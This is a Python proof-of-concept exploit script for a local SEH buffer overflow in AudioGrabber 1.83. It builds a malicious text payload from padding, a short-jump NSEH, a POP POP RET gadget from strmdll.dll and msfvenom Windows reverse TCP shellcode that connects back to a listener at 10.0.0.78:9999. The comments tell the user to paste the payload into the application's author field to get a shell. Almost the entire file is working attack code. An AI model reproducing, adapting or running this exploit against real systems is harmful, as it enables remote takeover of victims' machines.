#!/usr/bin/python
from struct import pack

#------------------------------------------------------------#
# To exploit it, run the .py exploit and paste the contents  #
# of audiograbber_evil.txt to the author field on the        #
# audiograbber 1.83 application, and wait for a shell        #
#------------------------------------------------------------#
# Exploit - AudioGrabber 1.83 local SEH overflow             #
#                                                            #
# POP POP RET - 0x48018624                                   #
# SEH - 0x48018624 - POPPOPRET - strmdll.dll                 #
# NSEH - "\xEB\x09\x90\x90" - JMP short forward 9            #
# BAD CHARS - "\x00\x0a\x0d    "                             #
# PAYLOAD - windows reverse TCP shell                        #
#   LHOST - 10.0.0.78                                        #
#   LPORT - 9999                                             #
#------------------------------------------------------------#
#   Author : x00pwn                                          #
#   Date: 10/3/2019                                          #
#   Victim system: Windows 7 pro                             #
#   Protections - DEP/no ASLR/no SAFESEH/no                  #
#------------------------------------------------------------#


# SEH handler overwritten with 69413569
# Log data, item 36
# Address=0BADF00D
# Message=    SEH record (nseh field) at 0x0018f168 overwritten with normal pattern : 0x69413569 (offset 256), followed by 3728 bytes of cyclic data after the handler

nseh_handler = "\xEB\x09\x90\x90"    # JMP 9 bytes forward over the SEH handler
seh_handler = pack('I', 0x48018624) # POP POP RET from strmdll.dll

# Log data, item 24
# Address=48018624
# Message=  0x48018624 : pop eax # pop ebp # ret 0x0c |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.1.00.3936 (C:\Program Files (x86)\Audiograbber\strmdll.dll)

#./msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.78 LPORT=9999 -f python -v shellcode_calc -b "\x00\x0a\x0d"
shellcode_calc =  ""
shellcode_calc += "\xdb\xc4\xd9\x74\x24\xf4\xbf\x2b\x9f\x83"
shellcode_calc += "\x8c\x5d\x33\xc9\xb1\x52\x31\x7d\x17\x03"
shellcode_calc += "\x7d\x17\x83\xc6\x63\x61\x79\xe4\x74\xe4"
shellcode_calc += "\x82\x14\x85\x89\x0b\xf1\xb4\x89\x68\x72"
shellcode_calc += "\xe6\x39\xfa\xd6\x0b\xb1\xae\xc2\x98\xb7"
shellcode_calc += "\x66\xe5\x29\x7d\x51\xc8\xaa\x2e\xa1\x4b"
shellcode_calc += "\x29\x2d\xf6\xab\x10\xfe\x0b\xaa\x55\xe3"
shellcode_calc += "\xe6\xfe\x0e\x6f\x54\xee\x3b\x25\x65\x85"
shellcode_calc += "\x70\xab\xed\x7a\xc0\xca\xdc\x2d\x5a\x95"
shellcode_calc += "\xfe\xcc\x8f\xad\xb6\xd6\xcc\x88\x01\x6d"
shellcode_calc += "\x26\x66\x90\xa7\x76\x87\x3f\x86\xb6\x7a"
shellcode_calc += "\x41\xcf\x71\x65\x34\x39\x82\x18\x4f\xfe"
shellcode_calc += "\xf8\xc6\xda\xe4\x5b\x8c\x7d\xc0\x5a\x41"
shellcode_calc += "\x1b\x83\x51\x2e\x6f\xcb\x75\xb1\xbc\x60"
shellcode_calc += "\x81\x3a\x43\xa6\x03\x78\x60\x62\x4f\xda"
shellcode_calc += "\x09\x33\x35\x8d\x36\x23\x96\x72\x93\x28"
shellcode_calc += "\x3b\x66\xae\x73\x54\x4b\x83\x8b\xa4\xc3"
shellcode_calc += "\x94\xf8\x96\x4c\x0f\x96\x9a\x05\x89\x61"
shellcode_calc += "\xdc\x3f\x6d\xfd\x23\xc0\x8e\xd4\xe7\x94"
shellcode_calc += "\xde\x4e\xc1\x94\xb4\x8e\xee\x40\x1a\xde"
shellcode_calc += "\x40\x3b\xdb\x8e\x20\xeb\xb3\xc4\xae\xd4"
shellcode_calc += "\xa4\xe7\x64\x7d\x4e\x12\xef\x88\x8f\x1c"
shellcode_calc += "\xa1\xe4\x8d\x1c\x1a\xfa\x18\xfa\x0e\x14"
shellcode_calc += "\x4d\x55\xa7\x8d\xd4\x2d\x56\x51\xc3\x48"
shellcode_calc += "\x58\xd9\xe0\xad\x17\x2a\x8c\xbd\xc0\xda"
shellcode_calc += "\xdb\x9f\x47\xe4\xf1\xb7\x04\x77\x9e\x47"
shellcode_calc += "\x42\x64\x09\x10\x03\x5a\x40\xf4\xb9\xc5"
shellcode_calc += "\xfa\xea\x43\x93\xc5\xae\x9f\x60\xcb\x2f"
shellcode_calc += "\x6d\xdc\xef\x3f\xab\xdd\xab\x6b\x63\x88"
shellcode_calc += "\x65\xc5\xc5\x62\xc4\xbf\x9f\xd9\x8e\x57"
shellcode_calc += "\x59\x12\x11\x21\x66\x7f\xe7\xcd\xd7\xd6"
shellcode_calc += "\xbe\xf2\xd8\xbe\x36\x8b\x04\x5f\xb8\x46"
shellcode_calc += "\x8d\x6f\xf3\xca\xa4\xe7\x5a\x9f\xf4\x65"
shellcode_calc += "\x5d\x4a\x3a\x90\xde\x7e\xc3\x67\xfe\x0b"
shellcode_calc += "\xc6\x2c\xb8\xe0\xba\x3d\x2d\x06\x68\x3d"
shellcode_calc += "\x64"

payload = "A" * 256
payload += nseh_handler
payload += seh_handler
payload += "\x90" * 16
payload += shellcode_calc
payload += "D" * (8000 - len(payload))

try:
    print("[x] Exploit POC for Audiograbber 1.83 local SEH\n")
    file_payload = open("audiograbber_evil.txt", 'w')
    print("[x] Creating a .txt file for out payload")
    file_payload.write(payload)
    print("[x] Writing malicious payload to .txt file")
    file_payload.close()
    print("[x] Copy the file contents to the author field on the application")
except:
    print("[!] Failed to create malicious .txt")
